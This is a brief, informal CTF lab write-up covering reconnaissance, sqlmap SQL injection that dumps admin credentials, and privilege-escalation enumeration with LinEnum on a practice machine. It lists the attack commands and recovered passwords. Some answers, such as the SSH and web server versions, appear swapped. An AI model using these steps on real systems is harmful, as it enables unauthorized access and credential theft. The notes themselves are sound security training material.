# BufferOverflow Basics i guess

####
I.P - 10.10.228.221
####

## nMAP results:


# 1. how many ports are open?

2

# 2. What is the http-title of the web server?

Apache2 Ubuntu Default Page: It works

# 3. What version is the ssh service?

Apache/2.4.18

# 4. What is the version of the web server?

OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

### using gobuster with the following cmd:

gobuster dir -u 10.10.228.221 -w /usr/share/wordlists/dirbuster-ng/wordlists/big.txt -x "php,txt,html"

what is the important file?

administrator.php

### using sqlmap (sqlinjection) 

using the cmd:

sqlmap -u http://10.10.228.221/administrator.php --form --dump

found that username is vulnerable to sqlinjection:

found the username and password:
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+

### found the shell after logging in as admin:

ran ls to find how many files are there in the current directory.
3


ran /home to find if pingu is still there in the server
yes

ssh password:

took a while and referred john hammond's vid to find out that it is saved in:
/var/hidden/pass

password is:pinguapingu

successfully installed linEnum.sh in: /usr/share/linenum

used cmd : scp /usr/share/linenum/linEnum.sh pingu@10.10.228.221:/tmp to upload the linenum file

ssh into the machine and ran:
chmod +x /tmp/LinEnum.sh
/tmp/LinEnum.sh

found a file with suid:
/opt/secret/root

found the hash actually i didnt and got the password:
love2fish
